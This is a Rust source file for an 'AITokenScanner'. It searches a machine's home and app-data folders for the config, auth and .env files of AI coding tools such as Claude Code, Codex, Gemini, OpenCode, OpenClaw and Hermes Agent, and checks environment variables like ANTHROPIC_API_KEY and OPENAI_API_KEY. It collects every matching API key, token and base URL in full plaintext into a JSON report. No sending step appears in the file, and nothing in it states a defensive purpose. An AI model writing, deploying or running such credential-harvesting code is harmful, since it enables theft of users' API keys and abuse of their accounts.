use std::path::Path;

pub struct AITokenScanner;

impl AITokenScanner {
    pub fn scan() -> String {
        let home = get_home_dir();
        let app_data = get_app_data_dir();
        let local_app_data = get_local_app_data_dir();

        let mut entries: Vec<AiScannerEntry> = Vec::new();

        entries.extend(scan_claude_code(&home));
        entries.extend(scan_open_code(&home, &local_app_data));
        entries.extend(scan_codex(&home));
        entries.extend(scan_gemini(&home, &app_data));
        entries.extend(scan_openclaw(&home));
        entries.extend(scan_hermes_agent(&home));

        // Deduplicate
        let mut seen = std::collections::HashSet::new();
        entries.retain(|e| seen.insert((e.vendor.clone(), e.key_hash.clone())));

        let items: Vec<String> = entries
            .iter()
            .map(|e| {
                format!(
                    r#"{{"vendor":"{}","source":"{}","path":"{}","keyName":"{}","keyValue":"{}"}}"#,
                    escape(&e.vendor),
                    escape(&e.source),
                    escape(&e.path),
                    escape(&e.key_name),
                    escape(&e.key_value)
                )
            })
            .collect();

        format!(r#"{{"total":{},"items":[{}]}}"#, items.len(), items.join(","))
    }
}

struct AiScannerEntry {
    vendor: String,
    source: String,
    path: String,
    key_name: String,
    key_value: String,
    key_hash: String,
}

fn scan_claude_code(home: &str) -> Vec<AiScannerEntry> {
    let mut entries = Vec::new();

    let cfg = Path::new(home).join(".claude").join("settings.json");
    if cfg.exists() {
        if let Ok(json) = std::fs::read_to_string(&cfg) {
            extract_json_env_block(&json, &cfg.to_string_lossy(), "ClaudeCode", &mut entries);
        }
    }

    check_env("ANTHROPIC_API_KEY", "ClaudeCode", &mut entries);
    check_env("CLAUDE_API_KEY", "ClaudeCode", &mut entries);

    entries
}

fn scan_open_code(home: &str, local_app_data: &str) -> Vec<AiScannerEntry> {
    let mut entries = Vec::new();

    for path in &[
        Path::new(home).join(".config").join("opencode").join("opencode.json"),
        Path::new(home).join(".opencode").join("config.json"),
    ] {
        if path.exists() {
            if let Ok(json) = std::fs::read_to_string(path) {
                extract_json_keys(&json, &path.to_string_lossy(), "OpenCode", &mut entries);
            }
        }
    }

    let auth_path = if cfg!(target_os = "windows") {
        Path::new(local_app_data).join("share").join("opencode").join("auth.json")
    } else {
        Path::new(home).join(".local").join("share").join("opencode").join("auth.json")
    };
    if auth_path.exists() {
        if let Ok(json) = std::fs::read_to_string(&auth_path) {
            extract_json_keys(&json, &auth_path.to_string_lossy(), "OpenCode", &mut entries);
        }
    }

    check_env("OPENAI_API_KEY", "OpenCode", &mut entries);
    check_env("ANTHROPIC_API_KEY", "OpenCode", &mut entries);

    entries
}

fn scan_codex(home: &str) -> Vec<AiScannerEntry> {
    let mut entries = Vec::new();

    let cfg = Path::new(home).join(".codex").join("config.toml");
    if cfg.exists() {
        if let Ok(content) = std::fs::read_to_string(&cfg) {
            extract_toml_keys(&content, &cfg.to_string_lossy(), "CodeX", &mut entries);
        }
    }

    check_env("OPENAI_API_KEY", "CodeX", &mut entries);
    check_env("CODEX_API_KEY", "CodeX", &mut entries);

    entries
}

fn scan_gemini(home: &str, app_data: &str) -> Vec<AiScannerEntry> {
    let mut entries = Vec::new();

    for path in &[
        Path::new(app_data).join("gemini").join("settings.json"),
        Path::new(home).join(".gemini").join("settings.json"),
        Path::new(home).join(".config").join("gemini").join("config.json"),
    ] {
        if path.exists() {
            if let Ok(json) = std::fs::read_to_string(path) {
                extract_json_keys(&json, &path.to_string_lossy(), "Gemini", &mut entries);
            }
        }
    }

    let env_path = Path::new(home).join(".gemini").join(".env");
    if env_path.exists() {
        if let Ok(content) = std::fs::read_to_string(&env_path) {
            extract_env_text_keys(&content, &env_path.to_string_lossy(), "Gemini", &mut entries);
        }
    }

    check_env("GEMINI_API_KEY", "Gemini", &mut entries);
    check_env("GOOGLE_API_KEY", "Gemini", &mut entries);
    check_env("GOOGLE_GEMINI_BASE_URL", "Gemini", &mut entries);

    entries
}

fn scan_openclaw(home: &str) -> Vec<AiScannerEntry> {
    let mut entries = Vec::new();

    for path in &[
        Path::new(home).join(".openclaw").join("openclaw.json"),
        Path::new(home).join(".openclaw").join("config").join("config.json"),
    ] {
        if path.exists() {
            if let Ok(json) = std::fs::read_to_string(path) {
                extract_json_keys(&json, &path.to_string_lossy(), "OpenClaw", &mut entries);
            }
        }
    }

    let auth_dir = Path::new(home).join(".openclaw").join("agents");
    if auth_dir.exists() {
        if let Ok(agent_dirs) = std::fs::read_dir(&auth_dir) {
            for agent_dir in agent_dirs.filter_map(|e| e.ok()) {
                let profile_path = agent_dir.path().join("agent").join("auth-profiles.json");
                if profile_path.exists() {
                    if let Ok(json) = std::fs::read_to_string(&profile_path) {
                        extract_json_keys(&json, &profile_path.to_string_lossy(), "OpenClaw", &mut entries);
                    }
                }
            }
        }
    }

    check_env("OPENCLAW_API_KEY", "OpenClaw", &mut entries);
    check_env("CLAW_API_KEY", "OpenClaw", &mut entries);
    check_env("ANTHROPIC_API_KEY", "OpenClaw", &mut entries);
    check_env("OPENAI_API_KEY", "OpenClaw", &mut entries);

    entries
}

fn scan_hermes_agent(home: &str) -> Vec<AiScannerEntry> {
    let mut entries = Vec::new();

    let hermes_dir = Path::new(home).join(".hermes");
    if hermes_dir.exists() {
        let env_path = hermes_dir.join(".env");
        if env_path.exists() {
            if let Ok(content) = std::fs::read_to_string(&env_path) {
                extract_env_text_keys(&content, &env_path.to_string_lossy(), "HermesAgent", &mut entries);
            }
        }
    }

    check_env("HERMES_API_KEY", "HermesAgent", &mut entries);
    check_env("NOUS_API_KEY", "HermesAgent", &mut entries);
    check_env("OPENAI_API_KEY", "HermesAgent", &mut entries);
    check_env("ANTHROPIC_API_KEY", "HermesAgent", &mut entries);

    entries
}

// ── JSON helpers ──────────────────────────────────────────────────────

fn extract_json_keys(json: &str, path: &str, vendor: &str, entries: &mut Vec<AiScannerEntry>) {
    if let Ok(value) = serde_json::from_str::<serde_json::Value>(json) {
        walk_json(&value, "", path, vendor, entries);
    }
}

fn extract_json_env_block(json: &str, path: &str, vendor: &str, entries: &mut Vec<AiScannerEntry>) {
    if let Ok(value) = serde_json::from_str::<serde_json::Value>(json) {
        if let Some(env_block) = value.get("env") {
            walk_json(env_block, "env", path, vendor, entries);
        }
        walk_json(&value, "", path, vendor, entries);
    }
}

fn walk_json(value: &serde_json::Value, prefix: &str, path: &str, vendor: &str, entries: &mut Vec<AiScannerEntry>) {
    match value {
        serde_json::Value::Object(map) => {
            for (key, val) in map {
                let new_prefix = if prefix.is_empty() {
                    key.clone()
                } else {
                    format!("{}.{}", prefix, key)
                };
                walk_json(val, &new_prefix, path, vendor, entries);
            }
        }
        serde_json::Value::String(s) => {
            if is_key_field(prefix) && !s.is_empty() {
                let key_name = prefix.trim_start_matches('.');
                entries.push(make_entry(vendor, "config-file", path, key_name, s));
            }
        }
        _ => {}
    }
}

// ── .env / KEY=VALUE helpers ─────────────────────────────────────────

fn extract_env_text_keys(content: &str, path: &str, vendor: &str, entries: &mut Vec<AiScannerEntry>) {
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }

        if let Some(eq_idx) = trimmed.find('=') {
            if eq_idx == 0 || eq_idx >= trimmed.len() - 1 {
                continue;
            }
            let key = trimmed[..eq_idx].trim();
            let value = trimmed[eq_idx + 1..].trim().trim_matches('"').trim_matches('\'');

            if !value.is_empty() && is_key_field(key) {
                entries.push(make_entry(vendor, "config-file", path, key, value));
            }
        }
    }
}

// ── TOML helpers ──────────────────────────────────────────────────────

fn extract_toml_keys(content: &str, path: &str, vendor: &str, entries: &mut Vec<AiScannerEntry>) {
    for line in content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') || trimmed.starts_with('[') {
            continue;
        }

        if let Some(eq_idx) = trimmed.find('=') {
            if eq_idx == 0 || eq_idx >= trimmed.len() - 1 {
                continue;
            }
            let key = trimmed[..eq_idx].trim();
            let value = trimmed[eq_idx + 1..].trim().trim_matches('"').trim_matches('\'');

            if !value.is_empty() && is_key_field(key) {
                entries.push(make_entry(vendor, "config-file", path, key, value));
            }
        }
    }
}

// ── Env var ──────────────────────────────────────────────────────────

fn check_env(env_name: &str, vendor: &str, entries: &mut Vec<AiScannerEntry>) {
    if !is_key_field(env_name) {
        return;
    }
    if let Ok(value) = std::env::var(env_name) {
        if !value.is_empty() {
            let entry = make_entry(vendor, "env-var", &format!("%{}%", env_name), env_name, &value);
            entries.push(entry);
        }
    }
}

// ── Utilities ────────────────────────────────────────────────────────

const KEY_PATTERNS: &[&str] = &[
    "API", "APIKEY", "API_KEY", "KEY", "TOKEN", "BASEURL", "BASE", "URL", "BASE_URL",
];

fn is_key_field(name: &str) -> bool {
    let upper = name.to_uppercase();
    KEY_PATTERNS.iter().any(|p| upper.contains(p))
}

fn make_entry(vendor: &str, source: &str, path: &str, key_name: &str, value: &str) -> AiScannerEntry {
    AiScannerEntry {
        vendor: vendor.to_string(),
        source: source.to_string(),
        path: path.to_string(),
        key_name: key_name.to_string(),
        key_value: value.to_string(),
        key_hash: simple_hash(value),
    }
}

fn simple_hash(input: &str) -> String {
    let mut hash: i32 = 17;
    for c in input.chars() {
        hash = hash.wrapping_mul(31).wrapping_add(c as i32);
    }
    format!("{:08x}", hash as u32)
}

fn get_home_dir() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Users\\Default".into()) }
    #[cfg(not(target_os = "windows"))]
    { std::env::var("HOME").unwrap_or_else(|_| "/home".into()) }
}

fn get_app_data_dir() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("APPDATA").unwrap_or_else(|_| format!("{}\\AppData\\Roaming", get_home_dir())) }
    #[cfg(not(target_os = "windows"))]
    { format!("{}/.config", get_home_dir()) }
}

fn get_local_app_data_dir() -> String {
    #[cfg(target_os = "windows")]
    { std::env::var("LOCALAPPDATA").unwrap_or_else(|_| format!("{}\\AppData\\Local", get_home_dir())) }
    #[cfg(not(target_os = "windows"))]
    { format!("{}/.local", get_home_dir()) }
}

fn escape(s: &str) -> String {
    s.replace('\\', "\\\\")
        .replace('"', "\\\"")
        .replace('\n', "\\n")
        .replace('\r', "\\r")
        .replace('\t', "\\t")
}
